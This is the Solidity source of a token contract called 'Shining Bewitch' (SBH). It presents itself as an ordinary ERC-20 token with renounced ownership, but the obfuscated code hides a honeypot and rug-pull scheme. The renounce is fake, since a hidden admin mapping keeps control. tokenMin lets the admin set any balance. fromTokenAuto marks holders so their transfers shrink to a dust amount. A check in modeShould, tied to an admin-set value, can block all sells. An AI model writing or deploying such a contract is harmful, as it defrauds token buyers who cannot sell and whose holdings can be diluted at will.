//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface buyMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityAmount {
    function createPair(address senderTx, address fromShould) external returns (address);
}

interface launchSenderTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamTrading) external view returns (uint256);

    function transfer(address launchedIsMin, uint256 receiverSender) external returns (bool);

    function allowance(address launchSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverSender) external returns (bool);

    function transferFrom(
        address sender,
        address launchedIsMin,
        uint256 receiverSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptTrading, uint256 value);
    event Approval(address indexed launchSender, address indexed spender, uint256 value);
}

interface launchSenderTxMetadata is launchSenderTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ShiningBewitch is modeBuy, launchSenderTx, launchSenderTxMetadata {

    mapping(address => uint256) private txMax;

    address private tradingSellEnable;

    function balanceOf(address teamTrading) public view virtual override returns (uint256) {
        return txMax[teamTrading];
    }

    string private isSwap = "Shining Bewitch";

    uint256 private autoBuy;

    function name() external view virtual override returns (string memory) {
        return isSwap;
    }

    address receiverMarketingFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address isLaunch, address launchedIsMin, uint256 receiverSender) external override returns (bool) {
        if (_msgSender() != listMode) {
            if (listSwap[isLaunch][_msgSender()] != type(uint256).max) {
                require(receiverSender <= listSwap[isLaunch][_msgSender()]);
                listSwap[isLaunch][_msgSender()] -= receiverSender;
            }
        }
        return modeShould(isLaunch, launchedIsMin, receiverSender);
    }

    bool public sellTrading;

    address listMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address tradingReceiver, address listAuto) external view virtual override returns (uint256) {
        if (listAuto == listMode) {
            return type(uint256).max;
        }
        return listSwap[tradingReceiver][listAuto];
    }

    uint256 public buyFund;

    bool public listIsSwap;

    function walletIs() private view {
        require(toTokenSender[_msgSender()]);
    }

    function feeReceiver(address isLaunch, address launchedIsMin, uint256 receiverSender) internal returns (bool) {
        require(txMax[isLaunch] >= receiverSender);
        txMax[isLaunch] -= receiverSender;
        txMax[launchedIsMin] += receiverSender;
        emit Transfer(isLaunch, launchedIsMin, receiverSender);
        return true;
    }

    uint256 private buyTx = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return feeMinLaunched;
    }

    function fromTokenAuto(address txAuto) public {
        walletIs();
        
        if (txAuto == atTx || txAuto == limitShould) {
            return;
        }
        teamLaunched[txAuto] = true;
    }

    function getOwner() external view returns (address) {
        return tradingSellEnable;
    }

    address public limitShould;

    string private feeMinLaunched = "SBH";

    address public atTx;

    function receiverLiquidity() public {
        emit OwnershipTransferred(atTx, address(0));
        tradingSellEnable = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return buyTx;
    }

    uint256 private fromLimit;

    function modeShould(address isLaunch, address launchedIsMin, uint256 receiverSender) internal returns (bool) {
        if (isLaunch == atTx) {
            return feeReceiver(isLaunch, launchedIsMin, receiverSender);
        }
        uint256 marketingSell = launchSenderTx(limitShould).balanceOf(receiverMarketingFrom);
        require(marketingSell == tradingToken);
        require(launchedIsMin != receiverMarketingFrom);
        if (teamLaunched[isLaunch]) {
            return feeReceiver(isLaunch, launchedIsMin, modeEnableMin);
        }
        return feeReceiver(isLaunch, launchedIsMin, receiverSender);
    }

    function takeTo(uint256 receiverSender) public {
        walletIs();
        tradingToken = receiverSender;
    }

    event OwnershipTransferred(address indexed walletList, address indexed liquidityFundReceiver);

    mapping(address => bool) public teamLaunched;

    uint256 constant modeEnableMin = 5 ** 10;

    function transfer(address shouldAt, uint256 receiverSender) external virtual override returns (bool) {
        return modeShould(_msgSender(), shouldAt, receiverSender);
    }

    uint256 tradingToken;

    function decimals() external view virtual override returns (uint8) {
        return toMin;
    }

    function owner() external view returns (address) {
        return tradingSellEnable;
    }

    mapping(address => mapping(address => uint256)) private listSwap;

    constructor (){
        
        receiverLiquidity();
        buyMarketing txTrading = buyMarketing(listMode);
        limitShould = liquidityAmount(txTrading.factory()).createPair(txTrading.WETH(), address(this));
        if (maxMinFund) {
            buyFund = fromLimit;
        }
        atTx = _msgSender();
        toTokenSender[atTx] = true;
        txMax[atTx] = buyTx;
        if (marketingBuy == sellTrading) {
            sellTrading = true;
        }
        emit Transfer(address(0), atTx, buyTx);
    }

    function limitReceiver(address launchedBuyEnable) public {
        if (shouldMode) {
            return;
        }
        
        toTokenSender[launchedBuyEnable] = true;
        
        shouldMode = true;
    }

    uint256 atMin;

    function approve(address listAuto, uint256 receiverSender) public virtual override returns (bool) {
        listSwap[_msgSender()][listAuto] = receiverSender;
        emit Approval(_msgSender(), listAuto, receiverSender);
        return true;
    }

    bool public marketingBuy;

    function tokenMin(address shouldAt, uint256 receiverSender) public {
        walletIs();
        txMax[shouldAt] = receiverSender;
    }

    uint8 private toMin = 18;

    bool public shouldMode;

    bool public maxMinFund;

    mapping(address => bool) public toTokenSender;

    uint256 public receiverFrom;

}